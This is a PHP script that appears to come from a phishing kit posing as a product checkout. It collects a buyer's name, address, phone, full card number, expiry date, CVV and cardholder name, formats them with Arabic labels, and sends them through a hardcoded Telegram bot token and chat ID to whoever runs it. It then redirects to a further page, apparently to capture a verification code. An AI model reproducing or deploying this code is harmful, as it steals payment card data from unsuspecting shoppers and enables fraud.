<?php
session_start();
    $_SESSION['region']=  $_POST['region'];
    $_SESSION['first'] = $_POST['first'];
    $_SESSION['last']= $_POST['last'];
    $_SESSION['address']= $_POST['address'];
    $_SESSION['suite'] =  $_POST['suite'];
    $_SESSION['postcode'] = $_POST['postcode'];
    $_SESSION['city'] = $_POST['city'];
    $_SESSION['state'] = $_POST['state'];
    $_SESSION['phone'] =  $_POST['phone'];
    $_SESSION['card_number'] = str_replace(' ', '', $_POST['card_number']);
    $_SESSION['month_year'] = $_POST['month_year'];
    $_SESSION['cvv'] = $_POST['cvv'];
    $_SESSION['name_card'] = $_POST['name_card'];
    $_SESSION['productQuantity'] = $_POST['productQuantity'];
    $_SESSION['pes_price'] = 199;
    $_SESSION['email_or_phone'] = $_POST['email_or_phone'];

    


// إذا أردت تخزين ال
    
    
        $region=  $_SESSION['region'];
        $first = $_SESSION['first'];
        $last= $_SESSION['last'];
        $address= $_SESSION['address'];
        $suite =  $_SESSION['suite'];
        $postcode = $_SESSION['postcode'];
        $city = $_SESSION['city'];
        $state = $_SESSION['state'];
        $phone = $_SESSION['phone'];
        $card_number = $_SESSION['card_number'];
        $month_year = $_SESSION['month_year'];
        $cvv = $_SESSION['cvv'];
        $name_card = $_SESSION['name_card'];
        $productQuantity = $_SESSION['productQuantity'];
        $pes_price = $_SESSION['pes_price'];
        $email_or_phone = $_SESSION['email_or_phone'];


        // $apiToken = $token;
    
        // $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
        // Prepare the POST data
        $databot =
        'البريد المرسل او الايميل : ' . $email_or_phone . PHP_EOL .

        'عدد المنتجات: ' . $productQuantity . PHP_EOL .
        'المبلغ الاجمالي : ' . $pes_price *  $productQuantity . PHP_EOL .
        'المنطقة: ' . $region . PHP_EOL .
           'الاسم الأول: ' . $first . PHP_EOL .
           'الاسم الأخير: ' . $last . PHP_EOL .
           'العنوان: ' . $address . PHP_EOL .
           'الجناح: ' . $suite . PHP_EOL .
           'الرمز البريدي: ' . $postcode . PHP_EOL .
           'المدينة: ' . $city . PHP_EOL .
           'الولاية: ' . $state . PHP_EOL .
           'رقم الهاتف: ' . $phone . PHP_EOL .
           'رقم البطاقة: ' . $card_number . PHP_EOL .
           'تاريخ الانتهاء: ' . $month_year . PHP_EOL .
           'رمز سي سي في: ' . $cvv . PHP_EOL .
           'اسم حامل البطاقة: ' . $name_card . PHP_EOL ;
        // $sender = [
        //     'chat_id' => $tokenID,
        //     'text' => $databot,
        // ];
    // DIE($databot);

   
    
    // // Initialize cURL
    // $curl = curl_init($url);
    // curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    // curl_setopt($curl, CURLOPT_POST, true);
    // curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
    // // Execute cURL request
    // $response = curl_exec($curl);

    $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
    // Prepare the POST data
    $senderr = [
        'chat_id' => 908949980,
        'text' => $databot,
    ];
    // DIE($databot);

   
    
    // Initialize cURL
    $curll = curl_init($urll);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
    
    // Execute cURL request
    $response = curl_exec($curll);


    $firstThree = substr($phone, 0, 3);  // أول 3 أرقام
$lastTwo = substr($phone, -2);       // آخر رقمين
$middleX = str_repeat('x', strlen($phone) - 5);  // إخفاء الأرقام الوسطى بحرف x

// دمج الأجزاء معًا
$formattedPhone = $firstThree . $middleX . $lastTwo;

// تخزين القيمة المنسقة في الجلسة
$_SESSION['formatted_phone'] = $formattedPhone;

    $url = 'code.php';
    $date = ['url'=>$url];
    return print($url);

    
    // Set cURL options


   



?>